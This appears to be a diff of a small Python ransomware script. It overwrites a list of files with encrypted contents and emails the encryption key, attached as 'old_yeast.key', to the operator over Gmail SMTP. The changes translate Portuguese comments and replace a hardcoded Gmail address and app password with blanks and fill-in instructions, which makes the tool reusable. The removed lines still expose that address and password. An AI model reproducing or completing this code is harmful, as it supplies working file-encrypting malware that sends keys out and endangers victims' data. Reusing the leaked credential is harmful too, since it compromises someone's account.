@@ -10,31 +10,29 @@ from email import encoders
 files = []
 
 def send_email_with_attachment(sender_email, receiver_email, subject, body, attachment_path, smtp_server, smtp_port, sender_password):
-    # Criação do objeto MIMEMultipart
     msg = MIMEMultipart()
     msg['From'] = sender_email
     msg['To'] = receiver_email
     msg['Subject'] = subject
 
-    # Corpo do e-mail
+    # E-mail body
     msg.attach(MIMEText(body, 'plain'))
 
-    # Abrindo o arquivo a ser anexado
+    # Opening the archive
     attachment = open(attachment_path, "rb")
 
-    # Instanciando o MIMEBase e anexando o arquivo
+    # Setting MIMEBase and the attachment
     part = MIMEBase('application', 'octet-stream')
     part.set_payload(attachment.read())
     encoders.encode_base64(part)
     part.add_header('Content-Disposition', f"attachment; filename= old_yeast.key")
 
-    # Anexando o arquivo ao e-mail
     msg.attach(part)
 
-    # Conectando ao servidor SMTP e enviando o e-mail
+    # Connecting the smtp server and sending the email
     server = smtplib.SMTP(smtp_server, smtp_port)
-    server.starttls()  # Usando TLS para segurança
-    server.login(sender_email, sender_password)  # Login
+    server.starttls()
+    server.login(sender_email, sender_password)
     text = msg.as_string()
     server.sendmail(sender_email, receiver_email, text)
     server.quit()
@@ -58,13 +56,13 @@ for file in files:
     with open(file, "wb") as bread:
         bread.write(contents_encrypted)     
 
-sender_email = "borgessantos5241@gmail.com"
-receiver_email = "borgessantos5241@gmail.com"
+sender_email = "" #set your email and the receiver email, you can set yourself as receiver
+receiver_email = ""
 subject = "corintios key"
 body = str(time.gmtime())
 smtp_server = "smtp.gmail.com"
 smtp_port = 587
-sender_password = "hkol wzbx raht mxsd"
+sender_password = "" #set your gmail app password
 
 send_email_with_attachment(sender_email, receiver_email, subject, body, attachment_path, smtp_server, smtp_port, sender_password)
 
